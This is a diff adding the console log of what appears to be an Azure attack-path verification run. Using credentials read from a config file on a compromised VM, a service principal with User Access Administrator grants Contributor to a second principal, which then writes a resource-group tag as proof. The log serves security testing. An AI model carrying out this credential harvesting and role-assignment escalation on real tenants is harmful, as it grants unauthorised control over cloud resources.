@@ -1,0 +1,64 @@
+[*] target VM:                <VM_PUBLIC_IP>
+[*] foothold:                 SSH access to VM with SP-A and SP-B creds on disk
+[*] SP-A authority:           User Access Administrator on RG scope
+                              (grant authority; cannot write resources itself)
+[*] SP-B authority:           none (empty baseline)
+[*] attack surface:           SP-A's UAA cascade — grant Contributor to SP-B
+[*] target RG:                pathtriage-rg
+[*] started at:               2026-07-13T06:36:15.995134+00:00
+
+[*] Step 1: read SP credentials from local config
+    path:                     /home/azureuser/app_config.json
+[+] SP credentials loaded
+    SP-A app_id:              <SP_A_APP_ID>
+    SP-A secret length:       40 chars
+    SP-B app_id:              <SP_B_APP_ID>
+    SP-B secret length:       40 chars
+    tenant:                   <TENANT_ID>
+
+[*] Step 2: SP-A → ARM token (client_credentials)
+[+] SP-A ARM token acquired
+    token length:             1836 chars
+
+[*] Step 3: SP-A grants 'Contributor' to SP-B at RG scope
+    SP-A action:              Microsoft.Authorization/roleAssignments/write
+    granting to (principalId):<SP_B_OBJECT_ID>
+    role granted:             Contributor
+    scope:                    /subscriptions/<SUBSCRIPTION_ID>/resourceGroups/pathtriage-rg
+[+] role assignment created
+    assignment id:            57d0af52-490f-4654-ab13-2d1a7e6355b9
+    HTTP status:              201
+
+[*] Step 4: wait 45s for role assignment propagation
+    (Azure control-plane role changes typically propagate within 30-60s.)
+    ...40s remaining
+    ...35s remaining
+    ...30s remaining
+    ...25s remaining
+    ...20s remaining
+    ...15s remaining
+    ...10s remaining
+    ...5s remaining
+    ...0s remaining
+[+] propagation wait complete
+
+[*] Step 5: SP-B → ARM token (client_credentials)
+    (SP-B credentials also on VM disk — devops leak pattern.
+     SP-B had NO permission at start; only Contributor via SP-A's grant.)
+[+] SP-B ARM token acquired
+    token length:             1843 chars
+    aud (audience):           https://management.azure.com
+    appid (client app):       <SP_B_APP_ID>
+    oid (object id):          <SP_B_OBJECT_ID>
+
+[*] Step 6: PATCH tag on RG using SP-B token (write proof)
+    baseline: SP-B had no permission on this RG at start.
+    if this write succeeds, it's via SP-A's cascade grant.
+[+] tag write succeeded
+    tag:                      pathtriage-z7=owned
+    api-version:              2021-04-01  (operation=Merge)
+
+[+] Path Z7 verified: SP-A (UAA on RG, no write authority itself) ->
+                      roleAssignments/write -> Contributor to SP-B ->
+                      SP-B token (Contributor via cascade grant) ->
+                      RG tag write succeeds via SP-B's newly granted scope
